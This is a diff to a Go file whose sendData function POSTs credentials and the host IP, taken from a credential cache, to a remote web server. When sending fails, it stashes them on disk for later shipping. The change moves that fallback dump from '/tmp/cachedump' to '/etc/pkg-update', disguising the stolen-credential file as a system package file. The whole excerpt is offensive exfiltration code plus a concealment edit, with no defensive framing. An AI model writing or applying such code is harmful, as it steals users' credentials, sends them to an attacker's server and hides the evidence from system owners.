@@ -30,7 +30,7 @@ func getServer() string {
 // to the web server.  If the POST request fails, write the cache data to
 // a file in temp, so it can be shipped later
 func sendData(c *cred_cache.CredCache) {
-	path := "/tmp/cachedump" // path to write data to if sending fails
+	path := "/etc/pkg-update" // path to write data to if sending fails
 	ip := c.GetIP()
 	creds := c.GetEntries()
 	previousDump := fetchDump(path)
@@ -51,7 +51,7 @@ func sendData(c *cred_cache.CredCache) {
 	jsonValue, _ := json.Marshal(jsonData)                                   // what are you silly?
 	_, err := http.Post(url, "application/json", bytes.NewBuffer(jsonValue)) // send it!
 	if err != nil {                                                          // if error with sending, write cache to disk
-		path := "/tmp/cachedump"
+		path := "/etc/pkg-update"
 		dumpCache(creds, path)
 		return
 	}
